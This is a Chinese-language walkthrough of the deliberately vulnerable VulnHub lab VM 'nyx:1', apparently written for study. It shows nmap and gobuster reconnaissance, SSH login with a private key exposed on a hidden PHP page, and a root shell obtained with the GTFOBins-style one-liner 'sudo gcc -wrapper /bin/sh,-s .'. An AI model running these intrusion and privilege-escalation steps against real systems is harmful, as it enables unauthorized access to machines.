# nyx:1主机渗透实现

- 靶机地址：https://www.vulnhub.com/entry/nyx-1,535/
- 下载地址：https://download.vulnhub.com/nyx/nyxvm.zip

## 信息收集：

### 主机发现

- 当前主机IP段：`192.168.2.0/24`,当前主机IP：`192.168.2.2`

- ```shell
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 01:57 EDT
  Nmap scan report for 192.168.2.1
  Host is up (0.00083s latency).
  MAC Address: 00:50:56:C0:00:01 (VMware)
  Nmap scan report for 192.168.2.8
  Host is up (0.00022s latency).
  MAC Address: 00:0C:29:76:FF:DF (VMware)
  Nmap scan report for 192.168.2.254
  Host is up (0.000085s latency).
  MAC Address: 00:50:56:E4:FB:DB (VMware)
  Nmap scan report for 192.168.2.2
  Host is up.
  Nmap done: 256 IP addresses (4 hosts up) scanned in 13.32 seconds
  ```

- 靶机IP：`192.168.2.8`



### 端口扫描

- TCP端口扫描

- ```shell
  └─$ sudo nmap -sT --min-rate 10000 -p- 192.168.2.8 -oA Nmap-scan/sT
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 01:59 EDT
  Nmap scan report for 192.168.2.8
  Host is up (0.00066s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 00:0C:29:76:FF:DF (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 12.41 seconds
  ```

- UDP端口扫描

- ```shell
  └─$ sudo nmap -sU --min-rate 10000 -p- 192.168.2.8 -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 02:03 EDT
  Warning: 192.168.2.8 giving up on port because retransmission cap hit (10).
  Nmap scan report for 192.168.2.8
  Host is up (0.00050s latency).
  All 65535 scanned ports on 192.168.2.8 are in ignored states.
  Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
  MAC Address: 00:0C:29:76:FF:DF (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 79.34 seconds
  ```

### 端口及操作系统扫描

- ```shell
  └─$ sudo nmap -sC -sV -O -p22,80 192.168.2.8 -oA Nmap-scan/sC  
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 02:05 EDT
  Nmap scan report for 192.168.2.8
  Host is up (0.00035s latency).
  
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
  | ssh-hostkey: 
  |   2048 fc:8b:87:f4:36:cd:7d:0f:d8:f3:16:15:a9:47:f1:0b (RSA)
  |   256 b4:5c:08:96:02:c6:a8:0b:01:fd:49:68:dd:aa:fb:3a (ECDSA)
  |_  256 cb:bf:22:93:69:76:60:a4:7d:c0:19:f3:c7:15:e7:3c (ED25519)
  80/tcp open  http    Apache httpd 2.4.38 ((Debian))
  |_http-title: nyx
  |_http-server-header: Apache/2.4.38 (Debian)
  MAC Address: 00:0C:29:76:FF:DF (VMware)
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Device type: general purpose
  Running: Linux 4.X|5.X
  OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
  OS details: Linux 4.15 - 5.8
  Network Distance: 1 hop
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 14.50 seconds
  ```

### 基础漏洞扫描

- ```shell
  └─$ sudo nmap --script=vuln -p22,80 192.168.2.8 -oA Nmap-scan/Script
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 02:43 EDT
  Nmap scan report for 192.168.2.8
  Host is up (0.00029s latency).
  
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  |_http-dombased-xss: Couldn't find any DOM based XSS.
  |_http-csrf: Couldn't find any CSRF vulnerabilities.
  | http-enum: 
  |_  /d41d8cd98f00b204e9800998ecf8427e.php: Seagate BlackArmorNAS 110/220/440 Administrator Password Reset Vulnerability
  MAC Address: 00:0C:29:76:FF:DF (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 38.24 seconds
  
  ```

## web发现

- web首页
- ![image-20230820141136636](https://raw.githubusercontent.com/r0o983/images/main/202308201411761.png)

### gobuster扫描

- ```shell
  └─$ sudo gobuster dir -u http://192.168.2.8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster -x txt,tar,zip,rar,php
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://192.168.2.8
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,tar,zip,rar,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.php                 (Status: 403) [Size: 276]
  /key.php              (Status: 200) [Size: 287]
  /.php                 (Status: 403) [Size: 276]
  /server-status        (Status: 403) [Size: 276]
  Progress: 1323360 / 1323366 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```

- 查看key.php页面,尝试进行sql注入无果-->提交位置为空,看起来更像是兔子洞
- ![image-20230820141345018](https://raw.githubusercontent.com/r0o983/images/main/202308201413144.png)



### 获取shell

- 根据之前在**基础漏洞扫描**时获得了一个php文件目录,访问后发现是一个ssh的私钥文件,尝试使用私钥文件进行登录

- ![image-20230820145601486](https://raw.githubusercontent.com/r0o983/images/main/202308201456588.png)

- 尝试使用root进行连接,依然需要密码,返回页面查看,发现`title`处提示`mpampis key`,使用mpampis用户名进行尝试

- ![image-20230820145918299](https://raw.githubusercontent.com/r0o983/images/main/202308201459346.png)

- 登录ssh获得初始shell,获得用户`flag`

- ```shell
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/nyxvm]
  └─$ ssh -i id_rsa mpampis@192.168.2.8                               
  The authenticity of host '192.168.2.8 (192.168.2.8)' can't be established.
  ED25519 key fingerprint is SHA256:y+UuWVNQjou5NV3bhJKmkFBqomxtGR0c5ydJPwmIz+E.
  This key is not known by any other names.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '192.168.2.8' (ED25519) to the list of known hosts.
  Linux nyx 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
  ███▄▄▄▄   ▄██   ▄   ▀████    ▐████▀ 
  ███▀▀▀██▄ ███   ██▄   ███▌   ████▀  
  ███   ███ ███▄▄▄███    ███  ▐███    
  ███   ███ ▀▀▀▀▀▀███    ▀███▄███▀    
  ███   ███ ▄██   ███    ████▀██▄     
  ███   ███ ███   ███   ▐███  ▀███    
  ███   ███ ███   ███  ▄███     ███▄  
   ▀█   █▀   ▀█████▀  ████       ███▄ 
  Last login: Fri Aug 14 19:15:05 2020 from 192.168.1.18
  mpampis@nyx:~$ ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
      link/ether 00:0c:29:76:ff:df brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.8/24 brd 192.168.2.255 scope global dynamic ens33
         valid_lft 1284sec preferred_lft 1284sec
      inet6 fe80::20c:29ff:fe76:ffdf/64 scope link 
         valid_lft forever preferred_lft forever
  mpampis@nyx:~$ whoami
  mpampis
  mpampis@nyx:~$ id
  uid=1000(mpampis) gid=1000(mpampis) groups=1000(mpampis),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
  mpampis@nyx:~$ ls -lhai
  total 36K
  138973 drwxr-xr-x 4 mpampis mpampis 4.0K Aug 14  2020 .
      19 drwxr-xr-x 3 root    root    4.0K Aug 14  2020 ..
  139223 -rw------- 1 mpampis mpampis  490 Aug 14  2020 .bash_history
  138974 -rw-r--r-- 1 mpampis mpampis  220 Aug 14  2020 .bash_logout
  138975 -rw-r--r-- 1 mpampis mpampis 3.5K Aug 14  2020 .bashrc
  139220 drwxr-xr-x 3 mpampis mpampis 4.0K Aug 14  2020 .local
  138976 -rw-r--r-- 1 mpampis mpampis  807 Aug 14  2020 .profile
  139214 drwx------ 2 mpampis mpampis 4.0K Aug 14  2020 .ssh
  138981 -rw-r--r-- 1 root    root      33 Aug 14  2020 user.txt
  mpampis@nyx:~$ cat user.txt 
  2cb67a256530577868009a5944d12637
  mpampis@nyx:~$ sudo -l
  Matching Defaults entries for mpampis on nyx:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
  
  User mpampis may run the following commands on nyx:
      (root) NOPASSWD: /usr/bin/gcc
  ```

## 提权

- 已知使用gcc可以获得root权限,并且不需要密码,所以这里直接使用一句话提权

- ```shell
  mpampis@nyx:~$ sudo gcc -wrapper /bin/sh,-s .
  # whoami
  root
  # uname -a
  Linux nyx 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
  # ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
      link/ether 00:0c:29:76:ff:df brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.8/24 brd 192.168.2.255 scope global dynamic ens33
         valid_lft 1243sec preferred_lft 1243sec
      inet6 fe80::20c:29ff:fe76:ffdf/64 scope link 
         valid_lft forever preferred_lft forever
  # cd /root
  # ls -lhai
  total 24K
      20 drwx------  3 root root 4.0K Aug 14  2020 .
       2 drwxr-xr-x 18 root root 4.0K Aug 14  2020 ..
    3669 -rw-------  1 root root    0 Aug 14  2020 .bash_history
    1162 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
  138978 drwxr-xr-x  3 root root 4.0K Aug 14  2020 .local
    1161 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
    3664 -rw-r--r--  1 root root    0 Aug 14  2020 root.txt
    3668 -rw-r--r--  1 root root  168 Aug 14  2020 .wget-hsts
  # cat root.txt  
  # cat root.txt  
  # python3 -c 'import pty;pty.spawn("/bin/bash")';
  root@nyx:~# cat root.txt 
  root@nyx:~# vim root.txt 
  bash: vim: command not found
  root@nyx:~# vi root.txt 
  
  ```

- Ps:作者你在干什么,root.txt文件里面什么都没有...